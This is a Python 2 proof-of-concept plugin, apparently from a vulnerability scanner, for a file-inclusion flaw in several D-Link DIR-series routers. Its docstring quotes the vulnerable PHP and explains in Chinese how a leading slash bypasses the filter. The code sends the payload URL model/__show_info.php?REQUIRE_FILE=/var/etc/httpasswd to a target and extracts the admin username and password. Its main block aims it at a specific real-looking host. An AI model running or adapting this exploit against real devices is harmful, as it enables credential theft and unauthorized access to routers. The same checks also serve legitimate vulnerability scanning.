#!/usr/bin/env python
# -*- coding: utf-8 -*-

'''
@author: gzh
@license: (C) Copyright 2013-2017, Node Supply Chain Manager Corporation Limited.
@contact: 937f5a138eb9c25ba5be79214f48bd31@qq.com
@software: PyCharm
@file: dlink_info_disclosure.py
@time: 2018/12/3 16:24
@refer: http://www.wooyun.org/bugs/wooyun-2010-066799 https://www.jb51.net/network/585490.html
@info: D-Link DIR-300 & DIR-320 & DIR-600 & DIR-615 文件信息包含漏洞
@desc: <?
if($REQUIRE_FILE == "var/etc/httpasswd" || $REQUIRE_FILE == "var/etc/hnapasswd")
{
    echo "<title>404 Not Found</title>\n";
    echo "<h1>404 Not Found</h1>\n";
}
else
{
    if($REQUIRE_FILE!="")
    {
        require($LOCALE_PATH."/".$REQUIRE_FILE);
    }
    else
    {
        echo $m_context;
        echo $m_context2;//jana added
        if($m_context_next!="")
        {
            echo $m_context_next;
        }
        echo "<br><br><br>\n";
        if($USE_BUTTON=="1")
        {echo "<input type=button name='bt' value='".$m_button_dsc."' onclick='click_bt();'>\n"; }
    }
}
?>
这里看到已经禁止了$REQUIRE_FILE的参数为var/etc/httpasswd和var/etc/hnapasswd。这么一看无法获取账号密码。但是我们可以从根路径开始配置httpasswd的路径，就可以绕过这个过滤了。
payload：localhost/model/__show_info.php?REQUIRE_FILE=/var/etc/httpasswd
这里设置REQUIRE_FILE=/var/etc/httpasswd 成功绕过上面的 if判断，进行任意文件读取。
'''

import urlparse
import time
import re


from ..miniCurl import Curl
from ..t  import T

class P(T):
    def __init__(self):
        T.__init__(self)

    def verify(self,head='',context='',ip='',port='',productname={},keywords='',hackresults=''):
        arg='http://'+ip+':'+port+'/'
        curl=Curl()
        result = {}
        result['result']=False

        payload = 'model/__show_info.php?REQUIRE_FILE=/var/etc/httpasswd'
        url = arg + payload
        code, head,res, errcode, _ = curl.curl2(url)
        start =  res.find('Main Content Start ')
        end = res.find('Main Content End')

        if res.find(':',start,end) != -1 and code == 200:
            m = re.search(r"(\w+):(\w+)", res)
            if m:
                output('/var/etc/httpasswd:' + m.group(0),result,'高危(HOLE)')

        del curl
        return result


def output(url,result,label):
    info = url + '  d-link  Vul '
    result['result']=True
    result['VerifyInfo'] = {}
    result['VerifyInfo']['type']='d-link Vul'
    result['VerifyInfo']['URL'] =url
    result['VerifyInfo']['payload']='/thirdparty/d-link/d-link_a7eba98a02fcad47d24f862457b9cc43.py'
    result['VerifyInfo']['level']=label
    result['VerifyInfo']['result'] =info

if __name__ == '__main__':
    print P().verify(ip='http://yunlai.cn:803/sfdsfds/',port='80')

#/root/github/poccreate/thirdparty/d-link/d-link_a7eba98a
